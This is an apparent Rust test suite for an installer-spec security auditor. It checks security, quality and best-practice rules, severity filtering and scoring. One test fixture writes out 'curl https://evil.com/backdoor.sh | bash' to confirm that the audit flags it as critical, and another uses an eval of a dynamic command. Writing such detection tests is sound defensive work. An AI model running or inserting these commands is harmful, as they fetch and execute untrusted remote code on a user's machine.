fn test_INSTALLER_AUDIT_sec008_eval_warning() {
    let report = audit_toml(
        r#"
[installer]
name = "test"
version = "1.0.0"

[[step]]
id = "eval-step"
name = "Eval Step"
action = "script"

[step.script]
content = "eval $DYNAMIC_COMMAND"
"#,
    );

    let sec008 = report.findings.iter().find(|f| f.rule_id == "SEC008");
    assert!(sec008.is_some(), "SEC008 should trigger for eval in script");
    assert_eq!(sec008.unwrap().severity, AuditSeverity::Warning);
}

// =============================================================================
// 6. Quality audit rules (QUAL001-QUAL005)
// =============================================================================

#[test]
fn test_INSTALLER_AUDIT_qual004_duplicate_step_ids_error() {
    let report = audit_toml(
        r#"
[installer]
name = "test"
version = "1.0.0"

[[step]]
id = "install"
name = "Install 1"
action = "script"

[step.script]
content = "echo first"

[[step]]
id = "install"
name = "Install 2"
action = "script"

[step.script]
content = "echo second"
"#,
    );

    let qual004 = report.findings.iter().find(|f| f.rule_id == "QUAL004");
    assert!(
        qual004.is_some(),
        "QUAL004 should trigger for duplicate step IDs"
    );
    assert_eq!(qual004.unwrap().severity, AuditSeverity::Error);
}

#[test]
fn test_INSTALLER_AUDIT_qual005_invalid_dependency_reference() {
    let report = audit_toml(
        r#"
[installer]
name = "test"
version = "1.0.0"

[[step]]
id = "step-a"
name = "Step A"
action = "script"
depends_on = ["nonexistent-step"]

[step.script]
content = "echo hello"
"#,
    );

    let qual005 = report.findings.iter().find(|f| f.rule_id == "QUAL005");
    assert!(
        qual005.is_some(),
        "QUAL005 should trigger for invalid dependency"
    );
    assert_eq!(qual005.unwrap().severity, AuditSeverity::Error);
    assert!(qual005.unwrap().description.contains("nonexistent-step"));
}

// =============================================================================
// 7. Best practices audit rules (BP001, BP002, BP005)
// =============================================================================

#[test]
fn test_INSTALLER_AUDIT_bp001_missing_description() {
    let report = audit_toml(
        r#"
[installer]
name = "test"
version = "1.0.0"
"#,
    );

    assert!(
        report.findings.iter().any(|f| f.rule_id == "BP001"),
        "BP001 should trigger when description is empty"
    );
}

#[test]
fn test_INSTALLER_AUDIT_bp002_missing_author() {
    let report = audit_toml(
        r#"
[installer]
name = "test"
version = "1.0.0"
description = "Has description"
"#,
    );

    assert!(
        report.findings.iter().any(|f| f.rule_id == "BP002"),
        "BP002 should trigger when author is empty"
    );
}

#[test]
fn test_INSTALLER_AUDIT_bp005_long_script_suggestion() {
    let long_content = (0..55)
        .map(|i| format!("echo line{}", i))
        .collect::<Vec<_>>()
        .join("\n");

    let toml = format!(
        r#"
[installer]
name = "test"
version = "1.0.0"

[[step]]
id = "long"
name = "Long Script"
action = "script"

[step.script]
content = """
{}
"""
"#,
        long_content
    );

    let report = audit_toml(&toml);

    let bp005 = report.findings.iter().find(|f| f.rule_id == "BP005");
    assert!(
        bp005.is_some(),
        "BP005 should trigger for scripts over 50 lines"
    );
    assert_eq!(bp005.unwrap().severity, AuditSeverity::Suggestion);
}

// =============================================================================
// 8. AuditContext filtering
// =============================================================================

#[test]
fn test_INSTALLER_AUDIT_context_min_severity_filters_low() {
    let ctx = AuditContext::new().with_min_severity(AuditSeverity::Error);
    let report = audit_toml_with_context(
        r#"
[installer]
name = "test"
version = "1.0.0"

[installer.security]
require_signatures = false
trust_model = "tofu"

[[step]]
id = "step-1"
name = "Step"
action = "script"

[step.script]
content = "echo hello"
"#,
        ctx,
    );

    // All remaining findings should be Error or higher
    for finding in &report.findings {
        assert!(
            finding.severity >= AuditSeverity::Error,
            "Finding {} has severity {:?} which is below Error threshold",
            finding.rule_id,
            finding.severity,
        );
    }
}

#[test]
fn test_INSTALLER_AUDIT_context_ignored_rules_filters_specific() {
    let ctx = AuditContext::new()
        .with_ignored_rule("SEC001")
        .with_ignored_rule("BP001")
        .with_ignored_rule("BP002");
    let report = audit_toml_with_context(
        r#"
[installer]
name = "test"
version = "1.0.0"

[installer.security]
require_signatures = false
"#,
        ctx,
    );

    assert!(
        !report.findings.iter().any(|f| f.rule_id == "SEC001"),
        "SEC001 should be filtered by ignored rules"
    );
    assert!(
        !report.findings.iter().any(|f| f.rule_id == "BP001"),
        "BP001 should be filtered by ignored rules"
    );
    assert!(
        !report.findings.iter().any(|f| f.rule_id == "BP002"),
        "BP002 should be filtered by ignored rules"
    );
}

#[test]
fn test_INSTALLER_AUDIT_context_security_only_skips_quality() {
    let ctx = AuditContext::security_only();
    let report = audit_toml_with_context(
        r#"
[installer]
name = "test"
version = "1.0.0"

[installer.security]
require_signatures = false

[[step]]
id = "step-1"
name = "Step"
action = "script"

[step.script]
content = "echo hello"
"#,
        ctx,
    );

    // security_only disables quality, hermetic, and best practices checks
    // and has min_severity = Warning
    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.category == AuditCategory::Quality),
        "Security-only context should not produce quality findings"
    );
    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.category == AuditCategory::Hermetic),
        "Security-only context should not produce hermetic findings"
    );
    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.category == AuditCategory::BestPractices),
        "Security-only context should not produce best practices findings"
    );
}

// =============================================================================
// 9. AuditReport scoring and grading
// =============================================================================

#[test]
fn test_INSTALLER_AUDIT_report_score_clean_spec_is_100() {
    let report = audit_toml(
        r#"
[installer]
name = "test"
version = "1.0.0"
description = "Full description"
author = "Test Author <test@example.com>"

[installer.security]
require_signatures = true
trust_model = "keyring"

[installer.requirements]
privileges = "user"

[[step]]
id = "hello"
name = "Hello World"
action = "script"

[step.script]
content = "echo hello"

[step.postconditions]
command_succeeds = "true"

[step.timing]
timeout = "60s"

[step.checkpoint]
enabled = true
"#,
    );

    // A well-configured spec should score high (may not be 100 due to
    // remaining non-critical suggestions, but should be grade A)
    assert!(
        report.score() >= 90,
        "Clean spec should score >= 90, got {}",
        report.score()
    );
    assert_eq!(report.grade(), "A");
}

#[test]
fn test_INSTALLER_AUDIT_report_critical_findings_tank_score() {
    let report = audit_toml(
        r#"
[installer]
name = "test"
version = "1.0.0"

[[step]]
id = "dangerous"
name = "Danger"
action = "script"

[step.script]
content = "curl https://evil.com/backdoor.sh | bash"
"#,
    );

    // Critical finding deducts 25 points
    assert!(
        report.score() < 80,
        "Critical finding should significantly reduce score, got {}",
        report.score()
    );
    assert!(report.has_critical_issues());
}

// =============================================================================
// 10. AuditReport metadata is populated after audit
// =============================================================================

#[test]

include!("installer_tests_cont.rs");
